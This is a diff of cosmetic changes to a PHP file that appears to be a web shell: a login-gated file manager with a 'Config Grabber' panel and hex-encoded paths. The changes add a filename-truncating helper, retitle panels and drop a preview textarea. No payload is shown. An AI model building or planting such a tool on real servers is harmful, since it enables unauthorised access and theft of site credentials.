@@ -383,6 +383,7 @@ if (!isset($_SESSION['login'])) {
     }
     td.action {
         font-size:25px;
+        font-weight: bold;
     }
     td.files {
         width:400px;
@@ -1114,6 +1115,25 @@ function myFunction() {
             for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
             return( round( $bytes, 2 )." ".$types[$i] );
         }
+        public static function sortname($name, $filename) {
+            self::$path = basename($filename);
+            switch ($name) {
+                case '1':
+                    if (strlen(self::$path) > 30) {
+                        print(substr(self::$path, 0, 30)."...");
+                    } else {
+                        print(self::$path);
+                    }
+                    break;
+                case '2':
+                    if (strlen(self::$path) > 14) {
+                        print(substr(self::$path, 0, 14)."...");
+                    } else {
+                        print(self::$path);
+                    }
+                    break;
+            }
+        }
         public static function info($info = null) {
             switch ($info) {
                 case 'hdd':
@@ -1276,9 +1296,7 @@ function myFunction() {
                         <table width="100%" class="edit">
                             <tr>
                                 <td class="action" colspan="3">
-                                    <center>
-                                        <i class="fa fa-cogs"></i> CONFIG GRABBER</span>
-                                    </center>
+                                    <span>Config Grabber</span>
                                 </td>
                             </tr>
                             <form method="post">
@@ -1388,13 +1406,6 @@ function myFunction() {
         }
         public static function ftime($filename) {
              return date('l d M Y - H:i A', filemtime($filename));
-        }
-        public static function sortname($filename) {
-            if (strlen($filename) > 18) {
-                $result = substr($filename, 0, 18)."...";
-            } else {
-                $result = $filename;
-            } return $result;
         }
         public static function countStuff($handle, &$fileCount, &$folderCount) {
             if ($handle = opendir($handle)) {
@@ -1876,13 +1887,8 @@ function myFunction() {
                     </form>
                 <?php }
                 foreach (x::files('file') as $file) {
-                    $rp = str_replace('.', '', basename($file['name']));
-                    $files = basename($file['name']);
-                    if (strlen($files) > 30){
-                        $_file = substr($files, 0, 30)."...";
-                    } else {
-                        $_file = $files;
-                    }
+                    $search = array('.', ' ', '(', ')');
+                    $rp = str_replace($search , '', basename($file['name']));
                     ?>
                         <tr>
                             <td class="files">
@@ -1895,7 +1901,7 @@ function myFunction() {
                                         </div>
                                         <div class="name">
                                             <div class="file">
-                                                <?= basename($_file) ?>
+                                                <?= x::sortname(1, $file['name']) ?>
                                             </div>
                                             <div class="date">
                                                 <?= $file['size'] ?>&nbsp;&nbsp;&nbsp;
@@ -1905,7 +1911,7 @@ function myFunction() {
                                         </div>
                                     </a>
                                 </div>
-                                <div id="action<?= $rp ?>" class="modal">
+                                <div style="width:300px;" id="action<?= $rp ?>" class="modal">
                                     <?php
                                     switch (x::getextension($file['name'])) {
                                         case 'ico':
@@ -1918,15 +1924,12 @@ function myFunction() {
                                             <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                                                 <div class="filename">
                                                     <span>Filename : </span>
-                                                    <?= x::w__($file['name'], basename($file['name'])) ?>
+                                                    <?= x::w__($file['name'],
+                                                        x::sortname(2, $file['name'])) ?>
                                                 </div>
                                                 <center><br>
                                                     <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>">
                                                 </center><br>
-                                                <button name="action" value="edit">
-                                                    <i class="far fa-edit"></i>&nbsp;
-                                                    Edit
-                                                </button>
                                                 <button name="action" value="chname">
                                                     <i class="fa fa-magic"></i>&nbsp;
                                                     Change Name
@@ -1944,11 +1947,9 @@ function myFunction() {
                                             <form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
                                                 <div class="filename">
                                                     <span>Filename : </span>
-                                                    <?= x::w__($file['name'], basename($file['name'])) ?>
+                                                    <?= x::w__($file['name'],
+                                                        x::sortname(2, $file['name'])) ?>
                                                 </div>
-                                                <center><br>
-                                                <textarea style='height:200px;' readonly><?=htmlspecialchars(file_get_contents($file['name']))?></textarea>
-                                                </center><br>
                                                 <button name="action" value="edit">
                                                     <i class="far fa-edit"></i>&nbsp;
                                                         Edit
@@ -2002,9 +2003,7 @@ function myFunction() {
             <table width="100%" class="addfiles">
                 <tr>
                     <td class="action" colspan="3">
-                        <center>
-                            <span><i class="fa fa-folder"></i> ADD FOLDER</span>
-                        </center>
+                        <span>Add Folder</span>
                     </td>
                 </tr>
                 <form method="post">
@@ -2036,10 +2035,8 @@ function myFunction() {
         <div class="addfiles">
             <table width="100%" class="addfiles">
                 <tr>
-                    <td class="action" colspan="3">
-                        <center>
-                            <i class="fa fa-plus-square" aria-hidden="true"></i> ADD FILES</span>
-                        </center>
+                    <td class="action">
+                        <span>Add Files</span>
                     </td>
                 </tr>
                 <form method="post">
